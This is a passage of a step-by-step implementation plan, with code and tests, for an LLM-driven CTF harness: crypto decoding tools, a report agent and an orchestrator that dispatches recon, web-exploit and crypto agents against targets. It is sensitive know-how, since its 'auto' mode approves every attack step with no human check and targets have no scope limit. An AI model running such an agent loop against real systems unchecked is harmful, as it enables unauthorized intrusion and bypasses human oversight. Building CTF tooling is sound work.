    elif h.startswith("$1$"):
        results.append("MD5 crypt")

    if not results:
        results.append(f"Unknown (length={length})")

    return f"Hash: {h}\nLength: {length}\nPossible types: {', '.join(results)}"


def tool_rot_bruteforce(text: str) -> str:
    """Try all ROT-N (Caesar cipher) rotations (1-25)."""
    results = []
    for n in range(1, 26):
        decoded = ""
        for c in text:
            if c.isalpha():
                base = ord('A') if c.isupper() else ord('a')
                decoded += chr((ord(c) - base + n) % 26 + base)
            else:
                decoded += c
        results.append(f"ROT-{n:2d}: {decoded}")
    return "\n".join(results)


def tool_xor_bruteforce(data: str, max_key_len: int = 1) -> str:
    """XOR brute-force with single-byte keys (0x00-0xFF)."""
    try:
        raw = bytes.fromhex(data.replace(" ", ""))
    except ValueError:
        raw = data.encode()

    results = []
    for key in range(256):
        decoded = bytes([b ^ key for b in raw])
        try:
            text = decoded.decode("ascii")
            if all(c in string.printable for c in text):
                results.append(f"Key 0x{key:02x}: {text}")
        except UnicodeDecodeError:
            continue

    if not results:
        return "No printable ASCII results found for any single-byte XOR key."
    return "\n".join(results[:50])


def tool_frequency_analysis(text: str) -> str:
    """Perform character frequency analysis on text."""
    letters = [c.lower() for c in text if c.isalpha()]
    total = len(letters)
    if total == 0:
        return "No alphabetic characters found."

    counter = Counter(letters)
    lines = [f"Total letters: {total}\n"]
    lines.append("Frequency (descending):")
    for char, count in counter.most_common():
        pct = count / total * 100
        bar = "#" * int(pct / 2)
        lines.append(f"  {char}: {count:4d} ({pct:5.1f}%) {bar}")

    english_freq = "etaoinshrdlcumwfgypbvkjxqz"
    sorted_chars = "".join(c for c, _ in counter.most_common())
    lines.append(f"\nYour text order:  {sorted_chars}")
    lines.append(f"English expected: {english_freq}")

    return "\n".join(lines)


# --- Tool definitions ---

CRYPTO_TOOLS = [
    {
        "name": "base64_decode",
        "description": "Decode a base64-encoded string.",
        "input_schema": {
            "type": "object",
            "properties": {
                "data": {"type": "string", "description": "Base64-encoded string to decode"},
            },
            "required": ["data"],
        },
    },
    {
        "name": "base64_encode",
        "description": "Encode a string to base64.",
        "input_schema": {
            "type": "object",
            "properties": {
                "data": {"type": "string", "description": "String to encode"},
            },
            "required": ["data"],
        },
    },
    {
        "name": "hex_decode",
        "description": "Decode a hex-encoded string to text.",
        "input_schema": {
            "type": "object",
            "properties": {
                "data": {"type": "string", "description": "Hex string (e.g. '48656c6c6f' or '0x48 0x65')"},
            },
            "required": ["data"],
        },
    },
    {
        "name": "hash_identify",
        "description": "Identify the likely type of a hash based on its length and format.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hash_str": {"type": "string", "description": "The hash string to identify"},
            },
            "required": ["hash_str"],
        },
    },
    {
        "name": "rot_bruteforce",
        "description": "Try all 25 ROT-N (Caesar cipher) rotations on a string. Useful for simple substitution ciphers.",
        "input_schema": {
            "type": "object",
            "properties": {
                "text": {"type": "string", "description": "Ciphertext to brute-force"},
            },
            "required": ["text"],
        },
    },
    {
        "name": "xor_bruteforce",
        "description": "XOR brute-force with all single-byte keys (0x00-0xFF). Input can be hex or ASCII.",
        "input_schema": {
            "type": "object",
            "properties": {
                "data": {"type": "string", "description": "Data to XOR (hex string or raw text)"},
                "max_key_len": {"type": "integer", "description": "Max key length (default 1)", "default": 1},
            },
            "required": ["data"],
        },
    },
    {
        "name": "frequency_analysis",
        "description": "Perform character frequency analysis. Compares letter distribution to English language frequencies.",
        "input_schema": {
            "type": "object",
            "properties": {
                "text": {"type": "string", "description": "Text to analyze"},
            },
            "required": ["text"],
        },
    },
]

CRYPTO_DISPATCH = {
    "base64_decode": lambda **kw: tool_base64_decode(**kw),
    "base64_encode": lambda **kw: tool_base64_encode(**kw),
    "hex_decode": lambda **kw: tool_hex_decode(**kw),
    "hash_identify": lambda **kw: tool_hash_identify(**kw),
    "rot_bruteforce": lambda **kw: tool_rot_bruteforce(**kw),
    "xor_bruteforce": lambda **kw: tool_xor_bruteforce(**kw),
    "frequency_analysis": lambda **kw: tool_frequency_analysis(**kw),
}

CRYPTO_SYSTEM_PROMPT = """You are a cryptography agent for CTF challenges and authorized security testing.
Your job is to analyze, decode, and crack encoded or encrypted data.

Strategy:
1. Examine the input data — look at length, character set, patterns, and structure.
2. Try common encodings first: base64, hex.
3. If it looks like a hash, identify it with hash_identify.
4. If it looks like a substitution cipher, try rot_bruteforce.
5. If it might be XOR-encrypted, try xor_bruteforce.
6. Use frequency_analysis to compare letter distributions to English.
7. Combine techniques — data may be multi-layered (e.g., base64 wrapping hex wrapping ROT13).

Report clearly:
- What encoding/encryption was identified
- The decoded/decrypted result
- Confidence level and reasoning
- If unable to crack, describe what was tried and suggest next steps"""


def create_crypto_agent(client: anthropic.Anthropic) -> BaseAgent:
    """Create a crypto agent instance."""
    return BaseAgent(
        name="crypto",
        system_prompt=CRYPTO_SYSTEM_PROMPT,
        tools=CRYPTO_TOOLS,
        tool_dispatch=CRYPTO_DISPATCH,
        client=client,
    )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_crypto.py -v`
Expected: all 10 tests PASS

- [ ] **Step 5: Commit**

```bash
git add agents/crypto.py tests/test_crypto.py
git commit -m "feat: add crypto agent with decode, hash ID, ROT, XOR, freq analysis tools"
```

---

### Task 6: Report Agent

**Files:**
- Create: `agents/report.py`
- Test: `tests/test_report.py`

**Interfaces:**
- Consumes: `BaseAgent` from `agents/base.py`, `state.py` functions
- Produces:
  - `REPORT_SYSTEM_PROMPT: str`
  - `create_report_agent(client: anthropic.Anthropic) -> BaseAgent`
  - `generate_report(state: dict, client: anthropic.Anthropic, output_dir: str) -> str` — generates and saves a consolidated report, returns the file path

- [ ] **Step 1: Write failing tests**

```python
# tests/test_report.py
import os
import tempfile
from unittest.mock import MagicMock
from agents.report import create_report_agent, generate_report, REPORT_SYSTEM_PROMPT
from state import create_state, add_target, update_findings


def test_create_report_agent():
    client = MagicMock()
    agent = create_report_agent(client)
    assert agent.name == "report"
    assert agent.tools == []


def test_report_system_prompt():
    assert "report" in REPORT_SYSTEM_PROMPT.lower()


def test_generate_report_creates_file():
    s = create_state()
    add_target(s, "10.10.10.1")
    update_findings(s, "10.10.10.1", "ports", [22, 80])
    update_findings(s, "10.10.10.1", "services", {"80": "Apache"})
    update_findings(s, "10.10.10.1", "vulns", ["SQLi in /login?id="])

    # Mock the client to return a report
    block = MagicMock()
    block.type = "text"
    block.text = "# Report\n\n## 10.10.10.1\n\nPorts: 22, 80\nVulns: SQLi"
    resp = MagicMock()
    resp.content = [block]
    resp.stop_reason = "end_turn"
    client = MagicMock()
    client.messages.create.return_value = resp

    with tempfile.TemporaryDirectory() as tmpdir:
        path = generate_report(s, client, output_dir=tmpdir)
        assert os.path.exists(path)
        assert path.endswith(".md")
        content = open(path, encoding="utf-8").read()
        assert "10.10.10.1" in content
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_report.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'agents.report'`

- [ ] **Step 3: Implement agents/report.py**

```python
# agents/report.py
"""Report agent — consolidates findings into a markdown report."""

import os
from datetime import datetime, timezone

import anthropic

from agents.base import BaseAgent
from state import format_target_findings


REPORT_SYSTEM_PROMPT = """You are a report agent for CTF competitions and authorized security testing.
Your job is to take raw findings from recon, web exploitation, and crypto analysis
and produce a clear, structured markdown report.

Structure the report as:
1. Executive summary (1-2 sentences)
2. For each target:
   a. Target info (IP, hostname, status)
   b. Open ports and services
   c. Web paths discovered
   d. Vulnerabilities found (with severity and evidence)
   e. Crypto findings (decoded values, cracked hashes)
   f. Notable observations
3. Prioritized next steps / attack recommendations

Be concise. Use tables where appropriate. Flag critical findings clearly."""


def create_report_agent(client: anthropic.Anthropic) -> BaseAgent:
    """Create a report agent instance (no tools — reads state only)."""
    return BaseAgent(
        name="report",
        system_prompt=REPORT_SYSTEM_PROMPT,
        tools=[],
        tool_dispatch={},
        client=client,
    )


def generate_report(state: dict, client: anthropic.Anthropic, output_dir: str = "reports") -> str:
    """Generate a consolidated report from state and save to output_dir. Returns file path."""
    os.makedirs(output_dir, exist_ok=True)

    # Build findings summary for the LLM
    findings_text = ""
    for target in state["targets"]:
        findings_text += format_target_findings(state, target) + "\n\n"

    if state["history"]:
        findings_text += "Activity log:\n" + "\n".join(state["history"][-30:])

    agent = create_report_agent(client)
    report_content = agent.run(
        f"Generate a comprehensive CTF recon report from these findings:\n\n{findings_text}",
        state,
    )

    # Save to file
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    targets = list(state["targets"].keys())
    name_part = targets[0].replace(".", "-") if targets else "report"
    filename = f"{name_part}-{timestamp}.md"
    filepath = os.path.join(output_dir, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(report_content)

    print(f"\n[+] Report saved to: {filepath}")
    return filepath
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_report.py -v`
Expected: all 3 tests PASS

- [ ] **Step 5: Commit**

```bash
git add agents/report.py tests/test_report.py
git commit -m "feat: add report agent for consolidated markdown reports"
```

---

### Task 7: Orchestrator and Harness CLI

**Files:**
- Create: `harness.py`
- Test: `tests/test_harness.py`

**Interfaces:**
- Consumes: all agents (`create_recon_agent`, `create_web_exploit_agent`, `create_crypto_agent`, `generate_report`), `state.py` functions, `recon_agent.load_api_key`
- Produces:
  - `main()` — interactive CLI entry point
  - `Orchestrator.__init__(self, client, state)` — sets up the orchestrator
  - `Orchestrator.propose_action(self) -> str` — asks LLM what to do next, returns proposal text
  - `Orchestrator.dispatch(self, agent_name, target, task) -> str` — runs an agent on a target

- [ ] **Step 1: Write failing tests**

```python
# tests/test_harness.py
from unittest.mock import MagicMock, patch
from harness import Orchestrator
from state import create_state, add_target, update_findings


def make_text_response(text):
    block = MagicMock()
    block.type = "text"
    block.text = text
    resp = MagicMock()
    resp.content = [block]
    resp.stop_reason = "end_turn"
    return resp


def test_orchestrator_init():
    client = MagicMock()
    state = create_state()
    orch = Orchestrator(client, state)
    assert orch.auto_mode is False


def test_orchestrator_propose_action():
    client = MagicMock()
    client.messages.create.return_value = make_text_response(
        "ACTION: recon | TARGET: 10.10.10.1 | REASON: Initial scan needed"
    )
    state = create_state()
    add_target(state, "10.10.10.1")
    orch = Orchestrator(client, state)
    proposal = orch.propose_action()
    assert "10.10.10.1" in proposal


def test_orchestrator_dispatch_recon():
    client = MagicMock()
    client.messages.create.return_value = make_text_response("Recon complete.")
    state = create_state()
    add_target(state, "10.10.10.1")
    orch = Orchestrator(client, state)
    result = orch.dispatch("recon", "10.10.10.1", "Run recon on 10.10.10.1")
    assert isinstance(result, str)


def test_orchestrator_dispatch_unknown_agent():
    client = MagicMock()
    state = create_state()
    orch = Orchestrator(client, state)
    result = orch.dispatch("unknown_agent", "10.10.10.1", "test")
    assert "Unknown agent" in result
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_harness.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'harness'`

- [ ] **Step 3: Implement harness.py**

```python
# harness.py
"""Agent harness — semi-autonomous orchestrator for CTF competitions."""

import os
import re
import sys

import anthropic

# Fix Windows terminal encoding
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

from agents.recon import create_recon_agent
from agents.web_exploit import create_web_exploit_agent
from agents.crypto import create_crypto_agent
from agents.report import generate_report
from recon_agent import load_api_key
from state import (
    create_state, add_target, set_target_status, add_history,
    format_state_summary, format_target_findings, get_pending_targets,
)

MODEL = os.getenv("RECON_MODEL", "claude-sonnet-4-6")

ORCHESTRATOR_SYSTEM_PROMPT = """You are a CTF orchestrator. You coordinate specialized agents to attack targets.

Available agents:
- recon: Port scanning, DNS, web discovery, enumeration
- web_exploit: SQLi, XSS, LFI, header injection on web services
- crypto: Decode/crack encoded data, hashes, ciphers

Based on the current state of all targets, propose the SINGLE best next action.

Response format (strict — follow exactly):
ACTION: <agent_name>
TARGET: <target>
TASK: <specific instruction for the agent>
REASON: <why this action is the best next step>

Rules:
- Always run recon first on new targets before other agents.
- Run web_exploit only after recon has found web services.
- Run crypto only when encoded/encrypted data has been found.
- If all targets are fully scanned, respond with: ACTION: report
- Be specific in TASK — reference actual ports, paths, and findings."""


class Orchestrator:
    def __init__(self, client: anthropic.Anthropic, state: dict):
        self.client = client
        self.state = state
        self.auto_mode = False
        self.agents = {
            "recon": lambda: create_recon_agent(client),
            "web_exploit": lambda: create_web_exploit_agent(client),
            "crypto": lambda: create_crypto_agent(client),
        }

    def propose_action(self) -> str:
        """Ask the LLM what to do next based on current state."""
        state_summary = format_state_summary(self.state)

        # Include detailed findings for each target
        details = ""
        for target in self.state["targets"]:
            details += format_target_findings(self.state, target) + "\n\n"

        recent_history = "\n".join(self.state["history"][-10:]) if self.state["history"] else "No actions yet."

        prompt = f"""Current state:
{state_summary}

Detailed findings:
{details}

Recent history:
{recent_history}

What should we do next?"""

        response = self.client.messages.create(
            model=MODEL,
            system=ORCHESTRATOR_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=500,
        )

        for block in response.content:
            if block.type == "text":
                return block.text
        return ""

    def dispatch(self, agent_name: str, target: str, task: str) -> str:
        """Run an agent on a target with the given task."""
        if agent_name not in self.agents:
            return f"Unknown agent: {agent_name}"

        agent = self.agents[agent_name]()
        set_target_status(self.state, target, "scanning")
        add_history(self.state, f"Running {agent_name} on {target}")

        result = agent.run(task, self.state)

        set_target_status(self.state, target, "done")
        add_history(self.state, f"Completed {agent_name} on {target}")

        return result

    def parse_proposal(self, proposal: str) -> dict:
        """Parse the orchestrator's ACTION/TARGET/TASK/REASON response."""
        parsed = {}
        for line in proposal.strip().split("\n"):
            for key in ["ACTION", "TARGET", "TASK", "REASON"]:
                if line.strip().upper().startswith(key + ":"):
                    parsed[key.lower()] = line.split(":", 1)[1].strip()
        return parsed


def main():
    api_key = load_api_key()
    client = anthropic.Anthropic(api_key=api_key)
    state = create_state()
    orch = Orchestrator(client, state)

    print("=" * 60)
    print("  CTF AGENT HARNESS")
    print("  Type 'help' for commands")
    print("=" * 60)
    print()

    # Check for targets from command line
    import argparse
    parser = argparse.ArgumentParser(description="CTF Agent Harness")
    parser.add_argument("targets", nargs="*", help="Initial targets to add")
    args = parser.parse_args()

    for t in args.targets:
        t = t.strip()
        if re.match(r'^[a-zA-Z0-9._:\-/]+$', t):
            add_target(state, t)
            print(f"  [+] Added target: {t}")

    while True:
        try:
            user_input = input("\nharness> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if not user_input:
            continue

        # Parse CLI commands
        if user_input == "help":
            print("Commands:")
            print("  add <target>       — Add a new target")
            print("  status             — Show all targets and status")
            print("  findings <target>  — Show findings for a target")
            print("  report             — Generate report now")
            print("  auto               — Toggle autonomous mode")
            print("  start              — Start orchestration loop")
            print("  quit               — Exit")
            continue

        if user_input.startswith("add "):
            target = user_input[4:].strip()
            if re.match(r'^[a-zA-Z0-9._:\-/]+$', target):
                add_target(state, target)
                print(f"  [+] Added target: {target}")
            else:
                print("  ERROR: Invalid target format")
            continue

        if user_input == "status":
            print(format_state_summary(state))
            continue

        if user_input.startswith("findings "):
            target = user_input[9:].strip()
            if target in state["targets"]:
                print(format_target_findings(state, target))
            else:
                print(f"  Target '{target}' not found")
            continue

        if user_input == "report":
            if not state["targets"]:
                print("  No targets to report on.")
            else:
                print("  Generating report...")
                path = generate_report(state, client)
                print(f"  Report saved to: {path}")
            continue

        if user_input == "auto":
            orch.auto_mode = not orch.auto_mode
            mode = "ON" if orch.auto_mode else "OFF"
            print(f"  Autonomous mode: {mode}")
            continue

        if user_input == "quit":
            print("Exiting.")
            break

        if user_input == "start":
            if not state["targets"]:
                print("  No targets added. Use 'add <target>' first.")
                continue

            print("\n  Starting orchestration loop...\n")
            while True:
                proposal_text = orch.propose_action()
                parsed = orch.parse_proposal(proposal_text)

                if not parsed.get("action"):
                    print(f"  [Orchestrator] {proposal_text}")
                    break

                if parsed["action"] == "report":
                    print("  [Orchestrator] All targets scanned. Generating report...")
                    path = generate_report(state, client)
                    print(f"  Report saved to: {path}")
                    break

                action = parsed.get("action", "?")
                target = parsed.get("target", "?")
                task = parsed.get("task", "?")
                reason = parsed.get("reason", "")

                print(f"  [Orchestrator] Proposed:")
                print(f"    Agent:  {action}")
                print(f"    Target: {target}")
                print(f"    Task:   {task}")
                print(f"    Reason: {reason}")

                if orch.auto_mode:
                    approve = "y"
                    print("    Auto-approved.")
                else:
                    try:
                        approve = input("    Approve? [y/n/skip/quit] ").strip().lower()
                    except (EOFError, KeyboardInterrupt):
                        print("\n  Stopping orchestration.")
                        break

                if approve == "y":
                    if target not in state["targets"]:
                        add_target(state, target)
                    result = orch.dispatch(action, target, task)
                    print(f"\n  [Result preview] {result[:300]}...")
                elif approve == "quit":
                    break
                elif approve == "skip":
                    add_history(state, f"Skipped {action} on {target}")
                    continue
                else:
                    add_history(state, f"Denied {action} on {target}")
                    continue

            continue

        print(f"  Unknown command: {user_input}. Type 'help' for commands.")


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_harness.py -v`
Expected: all 4 tests PASS

- [ ] **Step 5: Smoke test the CLI**

Run: `python harness.py --help`
Expected: shows usage with `targets` positional arg

- [ ] **Step 6: Commit**

```bash
git add harness.py tests/test_harness.py
git commit -m "feat: add orchestrator harness with interactive CLI"
```

---

### Task 8: Create tests/__init__.py and verify full test suite

**Files:**
- Create: `tests/__init__.py`

**Interfaces:**
- Consumes: all previous tasks
- Produces: passing test suite

- [ ] **Step 1: Create tests/__init__.py**

```python
# tests/__init__.py
```

- [ ] **Step 2: Run full test suite**

Run: `pytest tests/ -v`
Expected: all tests PASS across all test files (test_state, test_base_agent, test_recon_agent, test_web_exploit, test_crypto, test_report, test_harness)

- [ ] **Step 3: Fix any import path issues**

If tests fail with import errors, add to `tests/conftest.py`:
```python
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
```

- [ ] **Step 4: Commit**

```bash
git add tests/__init__.py tests/conftest.py
git commit -m "chore: add test init and fix import paths"
```

---
